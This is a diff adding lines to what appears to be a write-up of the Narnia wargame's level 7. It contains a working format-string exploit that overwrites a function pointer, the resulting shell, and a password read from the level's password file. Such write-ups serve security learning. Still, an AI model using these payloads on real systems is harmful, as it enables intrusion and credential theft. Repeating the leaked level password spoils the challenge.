@@ -231,4 +231,15 @@ Breakpoint 1, 0x08048685 in vuln ()
 Continuing.
 Way to go!!!!$ whoami
 narnia7
+narnia7@melinda:/narnia$ ./narnia7 $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%210x%n%129x%n%125x%n%3588x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+>
+before : ptrf() = 0x80486e0 (0xffffd60c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8
+mohthuphog
+$ 
 >```
